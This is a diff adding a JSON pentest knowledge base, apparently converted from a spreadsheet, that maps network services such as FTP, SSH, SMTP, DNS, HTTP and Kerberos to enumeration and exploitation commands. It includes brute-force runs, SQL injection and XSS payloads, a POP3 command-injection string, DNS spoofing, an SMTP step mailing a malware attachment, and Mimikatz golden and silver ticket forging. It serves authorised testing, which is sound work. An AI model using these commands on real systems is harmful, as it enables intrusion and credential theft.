@@ -1,0 +1,3175 @@
+{
+ "source": "network_vapt_knowledge_bank.xlsx",
+ "services": [
+  {
+   "key": "ftp-21",
+   "name": "FTP",
+   "ports": [
+    21
+   ],
+   "aliases": [
+    "ftp"
+   ],
+   "intro": "FTP (File Transfer Protocol) is a standard network protocol used to transfer files between a client and server over a TCP/IP network. In pentesting, FTP is often examined for vulnerabilities such as anonymous login access, weak passwords, and outdated software that could be exploited to gain unauthorized access to files or the server itself.",
+   "rows": [
+    {
+     "phase": "Enumeration",
+     "method": "Banner Grabbing",
+     "command": "nc <ip> <21>",
+     "command_desc": "using netcat we can listen to the port so it will also disclose the version",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "nmap script scan",
+     "command": "nmap --script ftp-* -p 21 <ip>",
+     "command_desc": "This command scans the specified IP address for FTP vulnerabilities and information using all Nmap FTP-related scripts on port 21.",
+     "description": "",
+     "remarks": "Performing an Nmap script scan can generate a lot of traffic, so please make sure to inform the project lead and the client before running the scan. It is better to select specific scripts and run them individually. You can find these scripts with the following command: ls -al /usr/share/nmap/scripts/ | grep -e ftp",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "CCert Grab",
+     "command": "openssl s_client -connect {IP}:21 -starttls ftp",
+     "command_desc": "This command initiates a connection to an FTP server at the specified IP address and port 21, then attempts to upgrade the connection to a secure TLS connection using the STARTTLS command",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Exploitation",
+     "method": "Anonymous login",
+     "command": "ftp anonymous@<ip>\n(password will be prompted just enter or type anonymous)",
+     "command_desc": "trying to access ftp without username and password",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Brute force",
+     "command": "hydra -L <username_file> -P <password_file> <ip> ftp",
+     "command_desc": "Brute forcing and guessing username and password for getting ftp connection using hydra tool",
+     "description": "",
+     "remarks": "Perform brute force based enumeration or attacks with concern of project lead and client knowledge.",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Bounce attack",
+     "command": "nmap -b <name>:<pass>@<ftp_server> <victim>\nnmap -Pn -v -p 21,80 -b ftp:ftp@10.2.1.5 127.0.0.1 #Scan ports 21,80 of the FTP\nnmap -v -p 21,22,445,80,443 -b ftp:ftp@10.2.1.5 192.168.0.1/24 #Scan the internal network (of the FTP) ports 21,22,445,80,443",
+     "command_desc": "Scanning internal hosts port for enumeration",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Note: Bounce attack",
+     "command": "Suppose an attacker wants to scan ports on a company's internal network. The attacker finds an FTP server on the public-facing part of the network that allows the PORT command. By sending the PORT command with internal IP addresses and port numbers, the attacker can use the FTP server to scan the internal network's open ports without directly accessing it.",
+     "command_desc": "",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    }
+   ]
+  },
+  {
+   "key": "ssh-22",
+   "name": "SSH",
+   "ports": [
+    22
+   ],
+   "aliases": [
+    "ssh"
+   ],
+   "intro": "SSH (Secure Shell) is a protocol used for securely accessing and managing remote servers over an encrypted connection. In penetration testing, SSH is commonly used to gain remote shell access to target systems, execute commands, transfer files securely, and tunnel traffic, often leveraging stolen credentials or exploiting vulnerabilities to establish a foothold in the network.",
+   "rows": [
+    {
+     "phase": "Enumeration",
+     "method": "Identifying open ports and services",
+     "command": "nmap -p22  <IP>",
+     "command_desc": "Checking whether 22 port open or not using nmap",
+     "description": "SSH, short for Secure Shell, is a service that helps in remotely manage infrastructure in a secure manner. SSH provides both password and public key-based authentication. This protocol also encrypts communication by using strong cryptographic algorithms that mitigate Man in the Middle (MitM) attacks.",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Enumeration of users by Metasploit Framework",
+     "command": "msfconsole\nuse scanner/ssh/ssh_enumusers",
+     "command_desc": "enumerating users via metasploit",
+     "description": "Metasploit Framework is preinstalled on Kali Linux. You can run the framework by using the command",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Banner Grabbing",
+     "command": "nmap -p22  <IP> -sV",
+     "command_desc": "Checking for ssh version",
+     "description": "Checking for ssh version",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Exploit search",
+     "command": "searchsploit openssh <version>",
+     "command_desc": "If ssh version is discovered with above command, search for exploit that installed on current machine",
+     "description": "search for exploits by using searchsploit module available in Kali Linux.",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Exploitation",
+     "method": "connect remote machine using SSH",
+     "command": "ssh <username>@<hostname>",
+     "command_desc": "remote logging using creds",
+     "description": "You can connect remote machine by providing the inputs username and hostname in the below format. For a successful connection, a correct password needs to be provided.",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Bruteforce",
+     "command": "hydra -L <username_file> -P <password_file> <ip> ssh",
+     "command_desc": "trying to guess the username and passwords to authenticate using hydra tool",
+     "description": "Once the ssh port is open, use Seclists Wordlists to brute force username and password.",
+     "remarks": "Perform brute force based enumeration or attacks with concern of project lead and client knowledge.",
+     "reference": ""
+    }
+   ]
+  },
+  {
+   "key": "telnet-23",
+   "name": "Telnet",
+   "ports": [
+    23
+   ],
+   "aliases": [
+    "telnet"
+   ],
+   "intro": "Telnet is a network protocol that allows for remote command-line interface access to a host over a network. In pentesting, Telnet can be used to connect to open ports to manually interact with network services, test for vulnerabilities, and gather information about the target system.",
+   "rows": [
+    {
+     "phase": "",
+     "method": "nmap",
+     "command": "nmap --script=telnet-brute.nse,telnet-encryption.nse,telnet-ntlm-info.nse <target>",
+     "command_desc": "The command runs Nmap with scripts for brute-forcing Telnet credentials, checking Telnet encryption, and gathering Telnet NTLM info on the specified target.",
+     "description": "NMap is a popular scanner tool to identify open ports. NMap also has a set of scripts database that can be used and identify more juicy information about the target. This tool is pre-installed on Kali Linux.",
+     "remarks": "Performing an Nmap script scan can generate a lot of traffic, so please make sure to inform the project lead and the client before running the scan. It is better to select specific scripts and run them individually. You can find these scripts with the following command: ls -al /usr/share/nmap/scripts/ | grep -e telnet",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Banner Grabbing",
+     "command": "telnet 10.10.10.34 25\nnc <ip> <port>",
+     "command_desc": "To grab the banner for getting telnet service version",
+     "description": "If the telnet is open, an attacker can easily grab a banner that may contain sensitive information or details related to services used by your target system.",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Anonymous login",
+     "command": "telnet <ip>\n(usernam and password will be prompted just enter or type anonymous)",
+     "command_desc": "Use telnet <ip>, and when prompted for a username and password, enter \"anonymous\".",
+     "description": "Anonymous login with out password",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Using Metasploit",
+     "command": "msfconsole\nsearch telnet\n(select any moduleto enumerate and use appropraitely)",
+     "command_desc": "using metasploit defalult modules to enumerate telnet",
+     "description": "You can use the Metasploit tool to enumerate Telnet. Metasploit tool is preinstalled on Kali Linux and can be launched by typing msfconsole in the Terminal.",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "MITM: Telnet Spoofing",
+     "command": "use auxiliary/server/capture/telnet\nset srvhost 192.168.0.102\nset banner Welcome to Hacking Articles\nexploit",
+     "command_desc": "to see the communication through telnet and an attacker can easily mitm",
+     "description": "An attack may use telnet spoofing as a Man-in-the-middle attack in order to capture the telnet login credential. This can achieve by generating a bogus telnet service in the network.",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Brute Forcing",
+     "command": "use auxiliary/scanner/telnet/telnet_login\nmsf auxiliary(telnet_login) > set rhosts 192.168.0.196\nmsf auxiliary(telnet_login) > set user_file /root/Desktop/user.txt\nmsf auxiliary(telnet_login) > set pass_file /root/Desktop/pass.txt\nmsf auxiliary(telnet_login) > set stop_on_success true\nmsf auxiliary(telnet_login) > exploit",
+     "command_desc": "trying to guess the username and passwords to authenticate to telnet using metasploit module",
+     "description": "use default telnet credentials wordlist in seclist of assestnotes",
+     "remarks": "Perform brute force based enumeration or attacks with concern of project lead and client knowledge.",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Telnet Credential Sniffing",
+     "command": "open wireshark and filter telnet",
+     "command_desc": "",
+     "description": "By default, Telnet does not encrypt all linked data, even passwords, and thus it is always possible to eavesdrop the communications and then use the password for malicious uses; someone who has network access between the two hosts used by Telnet can interrupt the packets between the source and target, and obtain authentication, password and data details. ---- Internal VAPT",
+     "remarks": "",
+     "reference": ""
+    }
+   ]
+  },
+  {
+   "key": "smtp25-587",
+   "name": "SMTP",
+   "ports": [
+    25,
+    587
+   ],
+   "aliases": [
+    "smtp",
+    "submission"
+   ],
+   "intro": "SMTP (Simple Mail Transfer Protocol) is a protocol used for sending emails across networks, and for a network pentester, it serves as a potential vector to exploit for vulnerabilities such as open relays, weak authentication, and improper encryption that could allow unauthorized access or data interception.",
+   "rows": [
+    {
+     "phase": "",
+     "method": "Banner Grabbing",
+     "command": "nc -vn <IP> 25",
+     "command_desc": "using netcat we can listen to the port so it will also disclose the version",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Metasploit",
+     "command": "msf5 auxiliary(auxiliary/scanner/smtp/smtp_enum) show options",
+     "command_desc": "The module that can perform user enumeration via SMTP in Metasploit Framework is the following:\n\nThe only thing that this module requires is to enter the IP address of the remote host and to execute it with the run command as the other options have been filled automatically from metasploit.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "user enumeration",
+     "command": "nmap –script smtp-enum-users.nse 172.16.212.133",
+     "command_desc": "This command uses the smtp-enum-users NSE (Nmap Scripting Engine) script to enumerate valid email users on the SMTP server running at the IP address 172.16.212.133. The script attempts to identify existing email accounts on the server by probing common SMTP commands like VRFY, EXPN, or RCPT TO",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Open Relay attack",
+     "command": "nmap -p25 --script smtp-open-relay 10.10.10.10 -v",
+     "command_desc": "This nmap command checks if the SMTP server on port 25 of the IP address 10.10.10.10 is vulnerable to open relay attacks",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "NTLM Auth - Information disclosure",
+     "command": "nmap --script smtp-ntlm-info --script-args smtp-ntlm-info.domain=example.com -p 25,465,587 <target-ip>",
+     "command_desc": "If the server supports NTLM auth (Windows) you can obtain sensitive info (versions)",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Nmap",
+     "command": "nmap --script smtp-commands -p 25,465,587 <target-ip>\nnmap --script smtp-vuln-cve2011-1764 -p 25,465,587 <target-ip>\nnmap --script smtp-* -p 25,465,587 <target-ip>",
+     "command_desc": "These nmap commands are used to perform various SMTP-related security scans, such as user enumeration, command discovery, vulnerability checks, and NTLM information retrieval, on specified ports (25, 465, 587) of a target IP",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "MX Domains",
+     "command": "dig mx example.com",
+     "command_desc": "queries the DNS for the Mail Exchange (MX) records of the domain \"example.com,\" which specify the mail servers responsible for receiving email on behalf of that domain.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Bruteforce",
+     "command": "nmap –script smtp-enum-users.nse 172.16.212.133 nmap --script smtp-brute -p 25,465,587 <target-ip>",
+     "command_desc": "This command uses the smtp-brute script to perform a brute-force attack against the SMTP service on the target IP, attempting to guess usernames and passwords",
+     "description": "",
+     "remarks": "Perform brute force based enumeration or attacks with concern of project lead and client knowledge.",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "STARTTLS",
+     "command": "# port 25\nopenssl s_client -starttls smtp -connect <target-ip>:25\n# Port 465\nopenssl s_client -crlf -connect <target-ip>:465\n# Port 587\nopenssl s_client -starttls smtp -crlf -connect <target-ip>:587",
+     "command_desc": "trying to connect to smtp by different methods using openssl tool",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Send Mail",
+     "command": "sendEmail -t to@domain.com -f from@attacker.com -s <ip smtp> -u \"Important subject\" -a /tmp/malware.pdf",
+     "command_desc": "trrying to send email using the smtp server",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    }
+   ]
+  },
+  {
+   "key": "dns-53",
+   "name": "DNS",
+   "ports": [
+    53
+   ],
+   "aliases": [
+    "domain"
+   ],
+   "intro": "",
+   "rows": [
+    {
+     "phase": "Enumeration",
+     "method": "Banner Grabbing",
+     "command": "# Use dig to determine DNS server versions\ndig version.bind CHAOS TXT @DNS\n\n# Alternatively, use nmap script to grab the banner\nnmap --script dns-nsid <DNS_IP>\n\n# Alternatively, use telnet to grab the banner\nnc -nv -u <DNS_IP> 53",
+     "command_desc": "Banner grabbing is used to identify DNS server versions. You can use the following tools to find banner grabbing",
+     "description": "",
+     "remarks": "",
+     "reference": "https://hackviser.com/tactics/pentesting/services/dns"
+    },
+    {
+     "phase": "",
+     "method": "Enumerate Any record",
+     "command": "dig any victim.com @<DNS_IP>",
+     "command_desc": "The record ANY will ask the DNS server to return all the available entries that it is willing to disclose.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Nmap",
+     "command": "nmap -n --script \"(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport\" <IP>",
+     "command_desc": "Perform enumeration actions using nmap scrip",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Enumerate using metasploit",
+     "command": "auxiliary/gather/enum_dns",
+     "command_desc": "Perform enumeration actions using metasploit modules",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "DNS - Reverse BF",
+     "command": "dnsrecon -r 127.0.0.0/24 -n <IP_DNS>  #DNS reverse of all of the addresses\ndnsrecon -r 127.0.1.0/24 -n <IP_DNS>  #DNS reverse of all of the addresses\ndnsrecon -r <IP_DNS>/24 -n <IP_DNS>   #DNS reverse of all of the addresses\ndnsrecon -d active.htb -a -n <IP_DNS",
+     "command_desc": "Performs a reverse DNS lookup on the IP range using the specified DNS server.",
+     "description": "",
+     "remarks": "Perform brute force based enumeration or attacks with concern of project lead and client knowledge.",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Zone transfer",
+     "command": "dig axfr @<DNS_IP> #Try zone transfer without domain\ndig axfr @<DNS_IP> <DOMAIN> #Try zone transfer guessing the domain\nfierce --domain <DOMAIN> --dns-servers <DNS_IP> #Will try toperform a zone transfer against every authoritative name server and if this doesn'twork, will launch a dictionary attack",
+     "command_desc": "A zone transfer is a type of DNS transaction where a secondary DNS server requests a complete copy of a DNS zone file from a primary DNS server. This zone file contains information about the domain’s DNS records, such as IP addresses, mail servers, and other resource records.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Reverse lookup",
+     "command": "dig -x <ip>\ndig -x 8.8.8.8",
+     "command_desc": "Reverse DNS lookup is a DNS query for the domain name associated with a given IP address.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Exploitation",
+     "method": "DNS spoofing",
+     "command": "ettercap -T -q -M arp:remote /<gateway-ip>// /<target-ip>// -P dns_spoof",
+     "command_desc": "DNS spoofing involves introducing corrupt Domain Name System data into a DNS resolver's cache, causing the name server to return an incorrect IP address, diverting traffic to the attacker's computer.\n\nPoisoning with Ettercap\nEttercap is a comprehensive suite for man-in-the-middle attacks on LAN. It can be used for DNS spoofing.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "DNS tunneling",
+     "command": "# Server side\niodined -f -c <tunnel-ip> <domain>\n\n# Client side\niodine <dns-server-ip> <domain>",
+     "command_desc": "On your server, run: ./iodined -f 10.0.0.1 test.com. On the client, run: ./iodine -f -r 192.168.0.1 test.com. Enter the same password.\nNow the client has the tunnel ip 10.0.0.2 and the server has 10.0.0.1.\nTry pinging each other through the tunnel.\nDone!",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Cache Snooping",
+     "command": "dig @<dns-server> <domain> +norecurse",
+     "command_desc": "Cache snooping is a technique to determine if a DNS server has specific records in its cache.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    }
+   ]
+  },
+  {
+   "key": "httphttps",
+   "name": "HTTP / HTTPS",
+   "ports": [
+    80,
+    443,
+    8080,
+    8443
+   ],
+   "aliases": [
+    "http",
+    "https",
+    "http-proxy",
+    "http-alt"
+   ],
+   "intro": "",
+   "rows": [
+    {
+     "phase": "Enumeration",
+     "method": "Any Packet Monitoring Tool such as wireshare or tcp dump",
+     "command": "",
+     "command_desc": "-",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "testssl",
+     "command": "",
+     "command_desc": "check for the outdated ssl or tls version utiliazed on the following target machine.",
+     "description": "",
+     "remarks": "-",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Dirb, Gobuster",
+     "command": "",
+     "command_desc": "-",
+     "description": "",
+     "remarks": "This activity will be performed with only low threads that we need not to disturb the production operations",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Browser, Burpsuite",
+     "command": "",
+     "command_desc": "-",
+     "description": "",
+     "remarks": "using any js file enumeration tools are partially allowed here but in low threads",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "nmap",
+     "command": "",
+     "command_desc": "nmap -sC -sV -p 443, 80 <ip>",
+     "description": "",
+     "remarks": "-",
+     "reference": ""
+    },
+    {
+     "phase": "Vulnerability Scanning",
+     "method": "Nikto",
+     "command": "",
+     "command_desc": "nikto -h <ip>",
+     "description": "",
+     "remarks": "This tool will initially runs on a polymorphic alogrithm that will ensure to not down the server or any operations by default. But we need to be ensure to not load any server while scanning.",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Nessus",
+     "command": "",
+     "command_desc": "-",
+     "description": "",
+     "remarks": "It is not recommend to perform this scan for mandatory but with knowledge of project lead and client we can perform.",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "wpscan, durpalscan, joomlascan",
+     "command": "",
+     "command_desc": "-",
+     "description": "",
+     "remarks": "All scans need to perfrom with low threads and ensure to not disturb the production operations",
+     "reference": ""
+    },
+    {
+     "phase": "Basic Manual exploitation",
+     "method": "admin' --\nadmin' #\nadmin'/*\n' or 1=1--\n' or 1=1#\n' or 1=1/*\n') or '1'='1--\n') or ('1'='1--",
+     "command": "",
+     "command_desc": "-",
+     "description": "",
+     "remarks": "Only limited payloads will be used to check the basic security of the web application and no scanners will be used here",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n\"><script>alert(1)</script>\n\"><img src=x onerror=alert(1)>",
+     "command": "",
+     "command_desc": "-",
+     "description": "",
+     "remarks": "Only limited payloads will be used to check the basic security of the web application and no scanners will be used here",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Check for outdated web techonologies used and if any CVE assigned",
+     "command": "",
+     "command_desc": "-",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "On rest parameters perform a basic test cases on web application to cover 360 degress",
+     "command": "",
+     "command_desc": "-",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    }
+   ]
+  },
+  {
+   "key": "kerberos-88",
+   "name": "Kerberos",
+   "ports": [
+    88
+   ],
+   "aliases": [
+    "kerberos-sec",
+    "kerberos"
+   ],
+   "intro": "",
+   "rows": [
+    {
+     "phase": "What is kerberos ?",
+     "method": "Kerberos is a powerful and widely-used authentication protocol that provides a secure way to verify the identities of users and services in a networked environment. By using tickets and encryption, it enhances security, supports single sign-on, and centralizes authentication management, making it an essential tool in modern network security.",
+     "command": "",
+     "command_desc": "",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Enumeration",
+     "method": "Nmap or netcat",
+     "command": "nmap -sV -p 88 <target_ip>\nnc -zv <target_ip> 88",
+     "command_desc": "confirm that the service running on port 88 is indeed a Kerberos service.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Enumeration of Usernames(Nmap)",
+     "command": "nmap -p 88 --script=krb5-enum-users <target_ip>",
+     "command_desc": "This script will attempt to enumerate valid usernames by querying the Kerberos service and will provide a list of discovered usernames.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Exploitation",
+     "method": "Kerbrute",
+     "command": "kerbrute userenum -d <domain> -U <user_list> -P <password_list> -dc-ip <dc_ip>",
+     "command_desc": "Kerbrute is a popular tool used for Kerberos brute-forcing attacks, specifically designed to perform brute-force attacks on Kerberos authentication. It’s commonly used in penetration testing and security assessments to identify weak or commonly used passwords in Kerberos-encrypted environments.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Impacket",
+     "command": "GetUserSPNs.py -dc-ip <dc_ip> -domain <domain> -username <username> -password <password>",
+     "command_desc": "This tool is used to extract Service Principal Names (SPNs) from a domain. It can be used to perform Kerberoasting by retrieving service tickets that can be cracked offline.",
+     "description": "",
+     "remarks": "Once we got the valid set of creds then only we can perform the kerbroasting",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "",
+     "command": "psexec.py <domain>/<username>:<password>@<target_ip> -command <command>\nExample: psexec.py EXAMPLE/administrator:P@ssw0rd@192.168.1.100 -command \"ipconfig\"",
+     "command_desc": "This tool is used for remote code execution on Windows systems via SMB.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "",
+     "command": "secretsdump.py -dc-ip <dc_ip> -domain <domain> -username <username> -password <password>",
+     "command_desc": "This tool extracts credentials and secrets from a domain controller, including NTLM hashes, Kerberos tickets, and more.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Post Exploitation",
+     "method": "John the Ripper or Hashcat",
+     "command": "john --wordlist=<password_list> <ticket_file>",
+     "command_desc": "Use password cracking tools like John the Ripper or Hashcat to crack the extracted tickets.",
+     "description": "",
+     "remarks": "In Detailed document will be covered in the Active directory Document",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Mimikatz",
+     "command": "mimikatz\nkerberos::ptt <ticket_file>",
+     "command_desc": "tickets are injected, you can access services or systems as the user or service account associated with the tickets.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Golden Ticket Attack",
+     "command": "mimikatz\nkerberos::golden /user:<username> /rc4:<ntlm_hash> /domain:<domain> /sid:<domain_sid> /ticket:<output_ticket>",
+     "command_desc": "A Golden Ticket attack involves forging a Ticket Granting Ticket (TGT) to gain full control over the domain.\nInject the Golden Ticket using Mimikatz or similar tools to gain administrative access across the domain.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Silver Ticket Attack",
+     "command": "mimikatz\nkerberos::tgt /user:<username> /rc4:<ntlm_hash> /sid:<domain_sid> /service:<service_name> /ticket:<output_ticket>",
+     "command_desc": "Use Mimikatz to inject the Silver Ticket and access the targeted service.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "psexec.py",
+     "command": "<domain>/<username>:<password>@<target_ip>",
+     "command_desc": "Identify additional targets or resources to further expand access within the network.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    }
+   ]
+  },
+  {
+   "key": "pop3",
+   "name": "POP3",
+   "ports": [
+    110,
+    995
+   ],
+   "aliases": [
+    "pop3",
+    "pop3s"
+   ],
+   "intro": "Post Office Protocol (POP) is described as a protocol within the realm of computer networking and the Internet, which is utilized for the extraction and retrieval of email from a remote mail server, making it accessible on the local device. Positioned within the application layer of the OSI model, this protocol enables users to fetch and receive email. The operation of POP clients typically involves establishing a connection to the mail server, downloading all messages, storing these messages locally on the client system, and subsequently removing them from the server. Although there are three iterations of this protocol, POP3 stands out as the most prevalently employed version.",
+   "rows": [
+    {
+     "phase": "Enumeration",
+     "method": "netcat",
+     "command": "nc -nv <IP> 110",
+     "command_desc": "Banner Grab",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "nmap",
+     "command": "nmap -sV -p 110,995 <target_ip>",
+     "command_desc": "Banner Grab",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "telnet",
+     "command": "telnet <target_ip> 110",
+     "command_desc": "Banner Grab",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "openssl client",
+     "command": "openssl s_client -connect <IP>:995 -crlf -quiet",
+     "command_desc": "Banner Grab",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Exploitation",
+     "method": "hydra",
+     "command": "hydra -l <username> -P password_list.txt pop3://<target_ip>:110",
+     "command_desc": "All are default scripts",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Test for clear text creds",
+     "command": "tcpdump -i <Interface> port 110",
+     "command_desc": "",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Command Injection via POP3 Commands",
+     "command": "telnet <target_ip> 110\nUSER test@example.com | whoami\nPASS 123456",
+     "command_desc": "The server should reject or sanitize malformed input. If it executes unintended commands, it may be vulnerable to command injection",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Check for buffer over flow",
+     "command": "USER AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...(long input)\nPASS BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB...(long input)",
+     "command_desc": "Monitor the server for crashes or abnormal behavior. Buffer overflows can lead to remote code execution (RCE) or denial of service (DoS)",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    }
+   ]
+  },
+  {
+   "key": "rpc-111",
+   "name": "RPC / Portmapper",
+   "ports": [
+    111
+   ],
+   "aliases": [
+    "rpcbind"
+   ],
+   "intro": "",
+   "rows": [
+    {
+     "phase": "",
+     "method": "",
+     "command": "Method",
+     "command_desc": "",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "",
+     "command": "Banner Grabbing",
+     "command_desc": "",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "",
+     "command": "Enum using Null Session",
+     "command_desc": "",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "",
+     "command": "Login as a user",
+     "command_desc": "",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "",
+     "command": "RPCinfo",
+     "command_desc": "",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "",
+     "command": "Extract user credentials",
+     "command_desc": "",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "",
+     "command": "Brute FOrce",
+     "command_desc": "",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "",
+     "command": "Find Groups and their Alias",
+     "command_desc": "",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "",
+     "command": "Find more info using Alias and note SIDs",
+     "command_desc": "",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "",
+     "command": "Find more info using SIDs",
+     "command_desc": "",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "",
+     "command": "Reset other Users Password",
+     "command_desc": "",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "",
+     "command": "Rpcdump",
+     "command_desc": "",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    }
+   ]
+  },
+  {
+   "key": "mssrpc135-593",
+   "name": "MS RPC",
+   "ports": [
+    135,
+    593
+   ],
+   "aliases": [
+    "msrpc"
+   ],
+   "intro": "",
+   "rows": [
+    {
+     "phase": "Enumeration",
+     "method": "Nmap enumeration",
+     "command": "nmap --script msrpc-enum -p 135 <target-ip>\n\n# rpcdump for dumping RPC endpoints /  remotely query the RPC locator service\nimpacket-rpcdump -port 135 <target-ip>\n# Find the Print System Remote Prototol or the Print System Asynchronous Remote Protocol\nimpacket-rpcdump -port 135 <target-ip> | grep -E 'MS-RPRN|MS-PAR'",
+     "command_desc": "These commands dump RPC information from port 135 of a target IP and filters the output to show only entries related to the MS-RPRN or MS-PAR protocols.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Metasploit --- enumerating DCERPC services",
+     "command": "msfconsole\nmsf> use auxiliary/scanner/dcerpc/endpoint_mapper\nmsf> use auxiliary/scanner/dcerpc/hidden\nmsf> use auxiliary/scanner/dcerpc/management\nmsf> use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor",
+     "command_desc": "These msfconsole commands in Metasploit load and configure various DCERPC (Distributed Computing Environment/Remote Procedure Call) scanner modules for auditing and discovery of endpoint and hidden services.",
+     "description": "",
